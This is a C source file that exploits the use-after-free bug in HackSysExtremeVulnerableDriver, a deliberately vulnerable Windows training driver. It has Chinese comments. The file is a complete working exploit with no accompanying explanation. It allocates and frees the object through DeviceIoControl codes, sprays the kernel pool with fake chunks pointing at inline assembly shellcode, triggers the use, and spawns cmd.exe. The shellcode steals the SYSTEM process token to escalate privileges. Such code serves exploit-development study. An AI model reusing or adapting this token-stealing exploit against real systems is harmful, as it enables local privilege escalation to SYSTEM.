#include<stdio.h>
#include<Windows.h>

/************************************************************************/
/*                 Write by Thunder_J 2019.6                            */
/************************************************************************/

typedef void(*FunctionPointer) ();

typedef struct _FAKE_USE_AFTER_FREE
{
	FunctionPointer countinter;
	char bufffer[0x54];
}FAKE_USE_AFTER_FREE, *PUSE_AFTER_FREE;

void ShellCode()
{
	_asm
	{
			nop
			pushad
			mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
			mov eax, [eax + 0x50]   // 找到_EPROCESS结构
			mov ecx, eax
			mov edx, 4				// edx = system PID(4)

			// 循环是为了获取system的_EPROCESS
		find_sys_pid :
			mov eax, [eax + 0xb8]	// 找到进程活动链表
			sub eax, 0xb8    		// 链表遍历
			cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
			jnz find_sys_pid

			// 替换Token
			mov edx, [eax + 0xf8]
			mov[ecx + 0xf8], edx
			popad
			ret
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}


int main()
{
	DWORD recvBuf;
	// 获取句柄
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);
	printf("Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		printf("获取句柄失败\n");
		return 0;
	}

	// 调用 AllocateUaFObject() 函数申请内存
	printf("Start to call AllocateUaFObject()...\n");
	DeviceIoControl(hDevice, 0x222013, NULL, NULL, NULL, 0, &recvBuf, NULL);

	// 调用 FreeUaFObject() 函数释放对象
	printf("Start to call FreeUaFObject()...\n");
	DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, 0, &recvBuf, NULL);

	printf("Start to write shellcode()...\n");
	//申请假的chunk
	PUSE_AFTER_FREE fakeG_UseAfterFree = (PUSE_AFTER_FREE)malloc(sizeof(FAKE_USE_AFTER_FREE));
	//指向我们的shellcode
	fakeG_UseAfterFree->countinter = ShellCode;
	//用A填满该chunk
	RtlFillMemory(fakeG_UseAfterFree->bufffer, sizeof(fakeG_UseAfterFree->bufffer), 'A');

	// 堆喷射
	printf("***********************************\n");
	printf("Start to heap spray...\n");
	for (int i = 0; i < 5000; i++)
	{
		DeviceIoControl(hDevice, 0x22201F, fakeG_UseAfterFree, 0x60, NULL, 0, &recvBuf, NULL);
	}
	printf("Start to call UseUaFObject()...\n");
	DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, 0, &recvBuf, NULL);

	printf("Start to create cmd...\n");
	CreateCmd();
	return 0;
}